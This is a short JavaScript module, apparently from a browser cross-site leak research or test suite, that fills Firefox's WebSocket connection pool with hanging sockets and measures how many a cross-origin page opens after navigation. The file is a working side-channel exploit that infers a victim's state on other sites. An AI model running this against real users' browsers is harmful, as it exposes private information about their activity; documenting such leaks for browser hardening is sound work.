import {BASE_URL} from '../config.js'

// Firefox counts sockets that are still connecting towards its 200 connection
// limit, so a hanging endpoint fills the pool without a single handshake
// completing. /sleep?t=15 never answers with a 101 and outlives this function.

let SOCKETS = []

const WS = `wss://${new URL(BASE_URL).host}/sleep?t=15`
// Ask for more than the limit so the surplus errors out and removes itself
const MAX = 250
const SLOTS = 10

const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const exaustWsLimit = (limit) => {
    for(let id = 0; id < limit; id++){
        let s = new WebSocket(WS)
        s.onerror = (e) => {
            SOCKETS = SOCKETS.filter((x) => x !== s)
        }
        SOCKETS.push(s)
    }
}

const killSockets = (n = SLOTS) => {
    let killed = 0
    while(killed < n && SOCKETS.length){
        SOCKETS.shift().close()
        killed++
    }
    return killed
}

const closeAllWs = () => {
    for(let s of SOCKETS){
        s.close()
    }
}

const chromeVersion = () => {
    let m = navigator.userAgent.match(/Chrom(?:e|ium)\/(\d+)/)
    return m ? parseInt(m[1], 10) : 0
}

const leak = async (url, waitTime = 3000) => {
    // Chromium serializes handshakes per IP, so a hanging endpoint blocks the
    // queue instead of filling the pool.
    if(chromeVersion()){
        return 'Not applicable in Chromium, see WebSocket Leak (GC)'
    }

    exaustWsLimit(MAX)
    await sleep(500)

    // how many we actually hold
    let pageWsLimit = SOCKETS.length

    // make room
    let killed = killSockets()
    await sleep(500)

    window.WW.location = url
    // wait for the WS on url to connect
    await sleep(waitTime)

    // try to take the slots back
    exaustWsLimit(killed)
    await sleep(400)

    let res = pageWsLimit - SOCKETS.length

    // cleanup
    closeAllWs()
    SOCKETS = []
    window.WW.location = 'about:blank'
    await sleep(2000)
    return res
}

export { leak }
